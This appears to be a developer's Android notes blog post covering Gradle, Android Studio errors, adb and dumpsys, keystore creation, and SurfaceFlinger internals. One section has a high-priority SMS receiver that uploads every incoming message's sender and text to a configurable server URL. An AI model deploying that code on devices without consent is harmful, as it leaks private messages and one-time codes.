+++
title = "About Android"
description = "try to develop an andorid app"
tags = [
    "android"
]
date = "2018-01-02"
topics = [
    "android"
]
toc = true
+++


## gradle dependencies

[dependencies types](https://developer.android.google.cn/studio/build/dependencies)

```
// Dependency on a local library module
implementation project(":mylibrary")

// Dependency on local binaries
implementation fileTree(dir: 'libs', include: ['*.jar'])

// Dependency on a remote binary
implementation 'com.example.android:app-magic:12.3'
```

dependency configurations

```
implementation
api
compileOnly
runtimeOnly
annotationProcessor
```

## proguard 
proguard not work for test app, [see this](https://github.com/googlesamples/android-testing-templates/issues/27)

## build apk without test app

you need to go to Build > Build APK(s) to have a non testable release apk that you can submit to the store.

## Unable to add window. Permission denied for this window type

[Unable to add window. Permission denied for this window type](https://stackoverflow.com/a/35716156/1087122)

If the app targets API level 23 or higher, the app user must explicitly grant this permission to the app through a permission management screen. 

```
private static final int OVERLAY_PERMISSION_REQ_CODE = 100;
    private Context context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        context = MainActivity.this;

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @RequiresApi(api = Build.VERSION_CODES.M)
            @Override
            public void onClick(View view) {
                //add the service here
                //make the button gone

                if ((Build.VERSION.SDK_INT >= 23)) {
                    if (!Settings.canDrawOverlays(context)) {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, OVERLAY_PERMISSION_REQ_CODE);
                    } else if (Settings.canDrawOverlays(context)) {
                        startService(new Intent(context, FloatingCircle.class));
                    }
                }
                else
                {
                    startService(new Intent(context, FloatingCircle.class));
                }

            }
        });

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == OVERLAY_PERMISSION_REQ_CODE) {
            startService(new Intent(context, FloatingCircle.class));

        }
    }
```

## Unable to instantiate service

You service needs to have a public no-args constructor. Otherwize, Android will not be able to instantiate it.
[Unable to instantiate service](https://stackoverflow.com/questions/5027147/android-runtimeexception-unable-to-instantiate-the-service) 

需要一个无参的构造函数

## Android Studio


### “cannot resolve symbol R” in Android Studio

[“cannot resolve symbol R” in Android Studio](https://stackoverflow.com/questions/17054000/cannot-resolve-symbol-r-in-android-studio)

1. 确保xml文件没有错误内容；
2. clean project and build and sync 

* Build -> Clean Project 
* File -> Sync Project with Gradle Files (tools bar with circle icon)

### Cannot resolve symbol 'xxx'

AS特有的诡异问题。现象为：gradle build成功，但编辑器里总是提示Cannot resolve symbol 'xxx'。

1. invalidate cache and restart 不一定好使；
2. clean and rebuild project也无效
3. 这时候，先需要将dependencies里对应的内容先注销（sync一次），再重新打开注释的dependencies内容，再sync一次

## insufficient permissions for device

need to restart adb server. `adb kill-server ； adb start-server`

[adb shell 出现 insufficient permissions for device](https://www.cnblogs.com/sipher/articles/2471205.html)

## about icon

[Android drawable的细节](https://blog.csdn.net/guolin_blog/article/details/50727753)

```
# icon size 
密度  建议尺寸
mipmap-mdpi 48 * 48
mipmap-hdpi 72 * 72
mipmap-xhdpi  96 * 96
mipmap-xxhdpi 144 * 144
mipmap-xxxhdpi  192 * 192

# about dpi
float xdpi = getResources().getDisplayMetrics().xdpi;
float ydpi = getResources().getDisplayMetrics().ydpi;

dpi范围 密度
0dpi ~ 120dpi ldpi
120dpi ~ 160dpi mdpi
160dpi ~ 240dpi hdpi
240dpi ~ 320dpi xhdpi
320dpi ~ 480dpi xxhdpi
480dpi ~ 640dpi xxxhdpi
```



## Android problem

### debug on device 

[debug on device](https://developer.android.com/studio/debug/)

You must use a `build variant` that includes `debuggable true` in the build configuration. 
```
android {
    buildTypes {
        customDebugType {
            debuggable true
            ...
        }
    }
}
```

### Waiting For Debugger

[Android Studio stuck at “Waiting For Debugger” forever](https://stackoverflow.com/questions/27436050/debugging-with-android-studio-stuck-at-waiting-for-debugger-forever)
> menu -> Run -> Attach debugger to Android process

### DELETE_FAILED_DEVICE_POLICY_MANAGER 

[应用程序不能卸载](https://blog.csdn.net/the01hierarch/article/details/7313071)是因为在手机的`安全-->设备管理器`中进行了激活，只有取消激活后才能删除。

[卸载程序](https://blog.csdn.net/kitty_landon/article/details/47300907)要调`IDevicePolicyManager`服务里（在`DevicePolicyManagerService.java`里实现）的`packageHasActiveAdmins()`函数检查是否具备admin权限，如果没有admin权限，则直接返回不卸载程序，有了admin才去卸载程序。

dump应用的权限信息通常可以看到 `provides-component:'device-admin'`

## Android ADB 

[commond line adb](https://developer.android.com/studio/command-line/adb)</br>
[doc for cn](https://developer.android.google.cn/studio/command-line/adb)

### how does adb shell getprop and setprop work

[Android system properties are being managed](https://stackoverflow.com/a/40624561/1087122)  by special property_service. The `/system/build.prop` is just one out of 4-6 (depending on the version) read-only files containing the default values that `property_service` uses to populate its internal in-memory database with during start-up. So changes to the files during run time would not propagate until after reboot.

The setprop and getprop commands are used to access the data in that database. Unless the property name starts with persist. - then the value gets stored in `/data/property` folder.

### adb overview and services

[question](https://stackoverflow.com/a/21338505/1087122)</br>

**A client**, which sends commands. The client runs on your development machine. You can invoke a client from a command-line terminal by issuing an adb command.</br>
**A daemon (adbd)**, which runs commands on a device. The daemon runs as a background process on each device.</br>
**A server**, which manages communication between the client and the daemon. The server runs as a background process on your development machine.

The source code for all 3 parts of ADB is in the same [system/core/adb](https://android.googlesource.com/platform/system/core/+/master/adb) folder. </br>
[overview](https://android.googlesource.com/platform/system/core/+/master/adb/OVERVIEW.TXT)</br>
[services](https://android.googlesource.com/platform/system/core/+/master/adb/SERVICES.TXT)

### adb devices 
[Where is the ADB server code that handles the “devices” command?](https://stackoverflow.com/a/21338505/1087122)

[source code for this question](https://github.com/aosp-mirror/platform_system_core/tree/master/adb)

[ it's in adb.cpp](https://github.com/aosp-mirror/platform_system_core/blob/9f5e6dbe854ca41d337a1fa8fc8efe95e22db04b/adb/adb.cpp#L1094)

## Android APK



### 点击icon到启动应用
[详解安卓从图表icon点击到APP启动界面加载流程](https://blog.csdn.net/qq_25047355/article/details/55260980)

### 生成签名文件

```
# need java JDK environment
# keytool --help
# keytool -genkey -help
 ~ keytool -genkey -alias gebitang.keystore -keyalg RSA -validity 20000 -keystore ./gebitang.keystore
Enter keystore password:
Re-enter new password:
What is your first and last name?
  [Unknown]:  JOECHINLEE
What is the name of your organizational unit?
  [Unknown]:  gebitang
What is the name of your organization?
  [Unknown]:  geb
What is the name of your City or Locality?
  [Unknown]:  Beijing
What is the name of your State or Province?
  [Unknown]:  Beijing
What is the two-letter country code for this unit?
  [Unknown]:  cn
Is CN=JOECHINLEE, OU=gebitang, O=geb, L=Beijing, ST=Beijing, C=cn correct?
  [no]:
What is your first and last name?
  [JOECHINLEE]:
What is the name of your organizational unit?
  [gebitang]:
What is the name of your organization?
  [geb]:
What is the name of your City or Locality?
  [Beijing]:
What is the name of your State or Province?
  [Beijing]:
What is the two-letter country code for this unit?
  [cn]:
Is CN=JOECHINLEE, OU=gebitang, O=geb, L=Beijing, ST=Beijing, C=cn correct?
  [no]:  yes

Enter key password for <gebitang.keystore>
  (RETURN if same as keystore password):
```

### dumpsys command
[dumpsys command](http://gityuan.com/2016/05/14/dumpsys-command/)
```
# list?
adb shell dumpsys -l
Currently running services:
DockObserver
OEMExService
SurfaceFlinger
accessibility
account
activity
alarm
android.security.keystore
appops
appwidget
audio
backup
battery
batteryproperties
batterystats
bluetooth_manager
carrier_config
clipboard
cneservice
com.qualcomm.location.izat.IzatService
commontime_management
connectivity
consumer_ir
content
country_detector
cpuinfo
dbinfo
device_policy
deviceidle
devicestoragemonitor
diskstats
display
display.qservice
dreams
drm.drmManager
dropbox
ethernet
extphone
fingerprint
gfxinfo
graphicsstats
imms
ims
input
input_method
iphonesubinfo
isms
isub
jobscheduler
launcherapps
listen.service
location
lock_settings
media.audio_flinger
media.audio_policy
media.camera
media.camera.proxy
media.player
media.radio
media.resource_manager
media.sound_trigger_hw
media_projection
media_router
media_session
meminfo
midi
mount
netpolicy
netstats
network_management
network_score
nfc
notification
package
permission
persistent_data_block
phone
power
print
processinfo
procstats
qtitetherservice
restrictions
rttmanager
samplingprofiler
scheduling_policy
search
sensorservice
serial
servicediscovery
simphonebook
sip
statusbar
telecom
telephony.registry
textservices
trust
uimode
updatelock
usagestats
usb
user
vibrator
voiceinteraction
wallpaper
webviewupdate
wifi
wifip2p
wifiscanner
window


# list
adb shell service list

Found 111 services:
0 ims: [com.android.ims.internal.IImsService]
1 sip: [android.net.sip.ISipService]
2 com.qualcomm.location.izat.IzatService: [com.qualcomm.location.izat.IIzatService]
3 carrier_config: [com.android.internal.telephony.ICarrierConfigLoader]
4 phone: [com.android.internal.telephony.ITelephony]
5 telecom: [com.android.internal.telecom.ITelecomService]
6 extphone: [com.android.internal.telephony.IExtTelephony]
7 isms: [com.android.internal.telephony.ISms]
8 iphonesubinfo: [com.android.internal.telephony.IPhoneSubInfo]
9 simphonebook: [com.android.internal.telephony.IIccPhoneBook]
10  isub: [com.android.internal.telephony.ISub]
11  qtitetherservice: [com.qualcomm.qti.tetherstatsextension.ITetherService]
12  nfc: [android.nfc.INfcAdapter]
13  cneservice: [com.quicinc.cne.ICNEManager]
14  imms: [com.android.internal.telephony.IMms]
15  media_projection: [android.media.projection.IMediaProjectionManager]
16  launcherapps: [android.content.pm.ILauncherApps]
17  fingerprint: [android.hardware.fingerprint.IFingerprintService]
18  trust: [android.app.trust.ITrustManager]
19  media_router: [android.media.IMediaRouterService]
20  media_session: [android.media.session.ISessionManager]
21  restrictions: [android.content.IRestrictionsManager]
22  print: [android.print.IPrintManager]
23  OEMExService: [com.oem.os.IOemExService]
24  graphicsstats: [android.view.IGraphicsStats]
25  dreams: [android.service.dreams.IDreamManager]
26  commontime_management: []
27  samplingprofiler: []
28  diskstats: []
29  voiceinteraction: [com.android.internal.app.IVoiceInteractionManagerService]
30  appwidget: [com.android.internal.appwidget.IAppWidgetService]
31  backup: [android.app.backup.IBackupManager]
32  jobscheduler: [android.app.job.IJobScheduler]
33  serial: [android.hardware.ISerialManager]
34  usb: [android.hardware.usb.IUsbManager]
35  midi: [android.media.midi.IMidiManager]
36  DockObserver: []
37  audio: [android.media.IAudioService]
38  listen.service: [com.qualcomm.listen.IListenService]
39  media.radio: [android.hardware.IRadioService]
40  media.sound_trigger_hw: [android.hardware.ISoundTriggerHwService]
41  media.audio_policy: [android.media.IAudioPolicyService]
42  wallpaper: [android.app.IWallpaperManager]
43  dropbox: [com.android.internal.os.IDropBoxManagerService]
44  search: [android.app.ISearchManager]
45  country_detector: [android.location.ICountryDetector]
46  location: [android.location.ILocationManager]
47  devicestoragemonitor: []
48  media.camera: [android.hardware.ICameraService]
49  notification: [android.app.INotificationManager]
50  updatelock: [android.os.IUpdateLock]
51  servicediscovery: [android.net.nsd.INsdManager]
52  connectivity: [android.net.IConnectivityManager]
53  ethernet: [android.net.IEthernetManager]
54  rttmanager: [android.net.wifi.IRttManager]
55  wifiscanner: [android.net.wifi.IWifiScanner]
56  wifi: [android.net.wifi.IWifiManager]
57  wifip2p: [android.net.wifi.p2p.IWifiP2pManager]
58  netpolicy: [android.net.INetworkPolicyManager]
59  netstats: [android.net.INetworkStatsService]
60  network_score: [android.net.INetworkScoreService]
61  textservices: [com.android.internal.textservice.ITextServicesManager]
62  network_management: [android.os.INetworkManagementService]
63  clipboard: [android.content.IClipboard]
64  statusbar: [com.android.internal.statusbar.IStatusBarService]
65  device_policy: [android.app.admin.IDevicePolicyManager]
66  deviceidle: [android.os.IDeviceIdleController]
67  persistent_data_block: [android.service.persistentdata.IPersistentDataBlockService]
68  lock_settings: [com.android.internal.widget.ILockSettings]
69  uimode: [android.app.IUiModeManager]
70  mount: [IMountService]
71  accessibility: [android.view.accessibility.IAccessibilityManager]
72  input_method: [com.android.internal.view.IInputMethodManager]
73  bluetooth_manager: [android.bluetooth.IBluetoothManager]
74  input: [android.hardware.input.IInputManager]
75  window: [android.view.IWindowManager]
76  alarm: [android.app.IAlarmManager]
77  consumer_ir: [android.hardware.IConsumerIrService]
78  vibrator: [android.os.IVibratorService]
79  sensorservice: [android.gui.SensorServer]
80  content: [android.content.IContentService]
81  account: [android.accounts.IAccountManager]
82  media.camera.proxy: [android.hardware.ICameraServiceProxy]
83  telephony.registry: [com.android.internal.telephony.ITelephonyRegistry]
84  scheduling_policy: [android.os.ISchedulingPolicyService]
85  webviewupdate: [android.webkit.IWebViewUpdateService]
86  usagestats: [android.app.usage.IUsageStatsManager]
87  battery: []
88  processinfo: [android.os.IProcessInfoService]
89  permission: [android.os.IPermissionController]
90  cpuinfo: []
91  dbinfo: []
92  gfxinfo: []
93  meminfo: []
94  procstats: [com.android.internal.app.IProcessStats]
95  activity: [android.app.IActivityManager]
96  user: [android.os.IUserManager]
97  package: [android.content.pm.IPackageManager]
98  display: [android.hardware.display.IDisplayManager]
99  power: [android.os.IPowerManager]
100 appops: [com.android.internal.app.IAppOpsService]
101 batterystats: [com.android.internal.app.IBatteryStats]
102 media.resource_manager: [android.media.IResourceManagerService]
103 media.player: [android.media.IMediaPlayerService]
104 media.audio_flinger: [android.media.IAudioFlinger]
105 batteryproperties: [android.os.IBatteryPropertiesRegistrar]
106 drm.drmManager: [drm.IDrmManagerService]
107 SurfaceFlinger: [android.ui.ISurfaceComposer]
108 display.qservice: [android.display.IQService]
109 android.service.gatekeeper.IGateKeeperService: []
110 android.security.keystore: [android.security.IKeystoreService]

```


### 签名、打包release版本

[Android Studio的两种模式及签名配置](https://www.cnblogs.com/details-666/p/keystore.html)

- 使用release版本 by Build Variants 

### 静态变量失效，数据保存

实际使用中发现静态变量赋值后再次使用时依然是原始默认值。建议[使用Shared Preferences](https://stackoverflow.com/a/10962472/1087122)或者统一定义 [Application](https://stackoverflow.com/a/8504129/1087122)中。

### 读取短信信息，动态请求权限

- [动态请求读取短信权限](https://android.jlelse.eu/detecting-sending-sms-on-android-8a154562597f) - pending

设置[android:priority](https://developer.android.com/guide/topics/manifest/intent-filter-element.html)，
```
# AndroidManifest.xml
<receiver
    android:name=".SmsBroadcastReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter android:priority="1000">
        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
    </intent-filter>
</receiver>

#发送短信
public class SmsBroadcastReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        sendSms(context, intent);
    }
}

# actual method
void sendSms(Context context, Intent intent) {
  if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
      String smsSender = "";
      StringBuilder sb = new StringBuilder();
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
          for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
              smsSender = smsMessage.getDisplayOriginatingAddress();
              sb.append(smsMessage.getMessageBody());
          }
      } else {
          Bundle smsBundle = intent.getExtras();
          if (smsBundle != null) {
              Object[] pdus = (Object[]) smsBundle.get("pdus");
              if (pdus == null) {
                  // Display some error to the user
                  Log.e(Utils.tag, "SmsBundle had no pdus key");
                  return;
              }
              SmsMessage[] messages = new SmsMessage[pdus.length];
              for (int i = 0; i < messages.length; i++) {
                  messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                  sb.append(messages[i].getMessageBody());
              }
              smsSender = messages[0].getOriginatingAddress();
          }
      }
      SharedPreferences settings = context.getSharedPreferences(Const.SAVE_DATE, 0);
      String phone = settings.getString(Const.phoneNum, SmsHelper.getPhoneNumber());
      String url = settings.getString(Const.smsUrl, SmsHelper.getReceiveSmsUrl());
      //Log.i(Utils.tag,  url+ " now phone number: " + phone);
      HttpClientUtil.uploadSmsInBackground(smsSender, sb.toString(), phone, url);
  }
```



## Android Surface System

Bn: BinderNative</br>
Bp: BinderProxy</br>
Java上层利用binder调用C++层的bn端，而后C++的bn端再将请求返回给上层

BpBinder binder的proxy端</br>
BBinder 与BpBinder对应的端

```
main_surfaceflinger.cpp	
SurfaceFlinger::publishAndJoinThreadPool();
```
```
/**--------------------
 * Base class and low-level protocol for a remotable object.
 * You can derive from this class to create an object for which other
 * processes can hold references to it.  Communication between processes
 * (method calls, property get and set) is down through a low-level
 * protocol implemented on top of the transact() API.
 */
class IBinder : public virtual RefBase


/*--------------------
 * This class defines the Binder IPC interface for accessing various
 * SurfaceFlinger features.
 */
class ISurfaceComposer: public IInterface

/*--------------------
 * This class defines the Binder IPC interface for the producer side of
 * a queue of graphics buffers.  It's used to send graphics data from one
 * component to another.  For example, a class that decodes video for
 * playback might use this to provide frames.  This is typically done
 * indirectly, through Surface.
 *
 * The underlying mechanism is a BufferQueue, which implements
 * BnGraphicBufferProducer.  In normal operation, the producer calls
 * dequeueBuffer() to get an empty buffer, fills it with data, then
 * calls queueBuffer() to make it available to the consumer.
 *
 * This class was previously called ISurfaceTexture.
 */
class IGraphicBufferProducer : public IInterface


/**********************************************************************************
 * CpuConsumer is a BufferQueue consumer endpoint that allows direct CPU
 * access to the underlying gralloc buffers provided by BufferQueue. Multiple
 * buffers may be acquired by it at once, to be used concurrently by the
 * CpuConsumer owner. Sets gralloc usage flags to be software-read-only.
 * This queue is synchronous by default.
 */

class CpuConsumer : public ConsumerBase


// ConsumerBase is a base class for BufferQueue consumer end-points. It
// handles common tasks like management of the connection to the BufferQueue
// and the buffer pool.
class ConsumerBase : public virtual RefBase,
        protected BufferQueue::ConsumerListener 
        

/*
 * This class defines the Binder IPC interface for the producer side of
 * a queue of graphics buffers.  It's used to send graphics data from one
 * component to another.  For example, a class that decodes video for
 * playback might use this to provide frames.  This is typically done
 * indirectly, through Surface.
 *
 * The underlying mechanism is a BufferQueue, which implements
 * BnGraphicBufferProducer.  In normal operation, the producer calls
 * dequeueBuffer() to get an empty buffer, fills it with data, then
 * calls queueBuffer() to make it available to the consumer.
 *
 * This class was previously called ISurfaceTexture.
 */
class IGraphicBufferProducer : public IInterface

class BufferQueue : public BnGraphicBufferProducer


```    

screencap方法的逻辑：
```
/frameworks/native/libs/gui/SurfaceComposerClient.cpp
```

### ScreenshotClient的update方法：

1. getCpuConsumer()：新建一个consumer，
2. 调用SurfaceFlinger端的captureScreen方法生成截图
3. 使用1中的consumer消费2中的截图，保存到指针mBuffer指向的内存中


### Minicap方法的逻辑：
1. 根据传递的参数设置截图信息，实际宽高、截图宽高、rotation；设置listener，传递给2中重新封装的FrameProxy
2. 应用1中的配置
    createVirtualDisplay()：
        createDisplay返回一个远程对象用来显示DisplayToken == SurfaceFlinger？</br>
        从Cpuconsumer中获取BufferQueue： BnGraphicBufferProducer，设置（图片）大小和（图片）格式。
        重新包装了一个listener—— class FrameProxy: public android::ConsumerBase::FrameAvailableListener
        consumer设置setFrameAvailableListener。class CpuConsumer : public ConsumerBase
    
    设置消费所需要用到的各个信息？最终获取到一个DisplayState 所需的内容
    android::SurfaceComposerClient::setDisplaySurface(mVirtualDisplay, mBufferQueue);
    android::SurfaceComposerClient::setDisplayProjection(mVirtualDisplay, android::DISPLAY_ORIENTATION_0, layerStackRect, visibleRect);
    android::SurfaceComposerClient::setDisplayLayerStack(mVirtualDisplay, 0); // default stack
    
    


通用逻辑：
使用surfaceComposerClient调用SurfaceFlinger中的具体实现


/frameworks/native/include/private/gui/LayerState.h
struct DisplayState


BufferQueue这个类是由应用程序在客户端通过和服务端的Client交互，提交消息给SurfaceFlinger处理时创建的Layer对象时在SurfaceTextureLayer类构造中创建的：
BufferQueue中有一个成员变量BufferSlot mSlots[NUM_BUFFER_SLOTS];即一个BufferQueue实际上最大可以有32个Buffer，即一个应用程序申请的Surface在SF端的Layer可以有32个图像缓存区。而这32个图形缓存区都有上面的mSlots维护着，每个Buffer有以下几种可变的状态，由BufferState mBufferState维护：
分别是FREE,DEQUEUED,QUEUE,ACQUIRED这4个状态，分别是空闲，出列被填充数据，入列代表有了数据，最终将入列后有了图形数据的缓冲区进行渲染。


[android的surfaceflinger原理讲解](http://blog.chinaunix.net/uid-20564848-id-96788.html)

[Android应用程序与SurfaceFlinger服务的关系概述和学习计划](http://blog.csdn.net/luoshengyang/article/details/7846923)

[Android4.2.2 SurfaceFlinger之图形缓存区申请与分配dequeueBuffer](http://blog.csdn.net/gzzaigcnforever/article/details/21892067)

[Android5.1中surface和CpuConsumer下生产者和消费者间的处理框架简述](http://blog.csdn.net/gzzaigcnforever/article/details/49025297)

[Graphics architecture](https://source.android.com/devices/graphics/architecture.html)




[SurfaceFlinger:](https://source.android.com/devices/graphics/) 

>the system service that consumes the currently visible surfaces and composites them onto the display using information provided by the Window Manager. SurfaceFlinger is the only service that can modify the content of the display. SurfaceFlinger uses OpenGL and the Hardware Composer to compose a group of surfaces.



[SurfaceFlinger](http://stackoverflow.com/a/21654896/1087122) 

>is an Android system service, responsible for compositing all the application and system surfaces into a single buffer that is finally to be displayed by display controller.

>Let's zoom in above statement.

>SurfaceFlinger is a system wide service but it is not directly available to application developer as Sensor or other services can be. Every time you want to update your UI, SurfaceFlinger will kick in. This explains why SurfaceFlinger is a battery drainer.

>Besides your application surfaces, there are system surfaces, including status bar, navigation bar and, when rotation happens, surfaces created by the system for rotation animation. Most applications have only one active surface - the one of current foreground activity, others have more than one when SurfaceView is used in the view hierarchy or Presentation mode is used.

>SurfaceFlinger is responsible for COMPOSITING all those surfaces. A common misunderstanding is that SurfaceFinger is for DRAWING. It is not correct. Drawing is the job of OpenGL. The interesting thing is SurfaceFlinger used openGL for compositing as well.

>The composition result will be put in a system buffer, or native window, which is the source for display controller to fetch data from. This is what you see in the screen.


### aidl工具：
Example：
```
F:\>aidl -IF:\android\sources\08_android-2.2\frameworks\base\core\java\ -IF:\android\sources\08_android-2.2\frameworks\base\graphics\java F:\android\sources\08_android-2.2\frameworks\base\core\java\android\view\IWindowSession.aidl testme.java
F:\>aidl -IF:\android\sources\18_android-4.3_r2.3\frameworks\base\core\java\ -IF:\android\sources\18_android-4.3_r2.3\frameworks\base\graphics\java\ F:\android\sources\18_android-4.3_r2.3\frameworks\base\core\java\android\view\IWindowSession.aidl testme18.java
```
```
F:\>aidl
INPUT required
usage: aidl OPTIONS INPUT [OUTPUT]
       aidl --preprocess OUTPUT INPUT...

OPTIONS:
   -I<DIR>    search path for import statements.
   -d<FILE>   generate dependency file.
   -a         generate dependency file next to the output file with the name based on the input file.
   -p<FILE>   file created by --preprocess to import.
   -o<FOLDER> base output folder for generated files.
   -b         fail when trying to compile a parcelable.

INPUT:
   An aidl interface file.

OUTPUT:
   The generated interface files.
   If omitted and the -o option is not used, the input filename is used, with the .aidl extension changed to a .java extension.
   If the -o option is used, the generated files will be placed in the base output folder, under their package folder
```

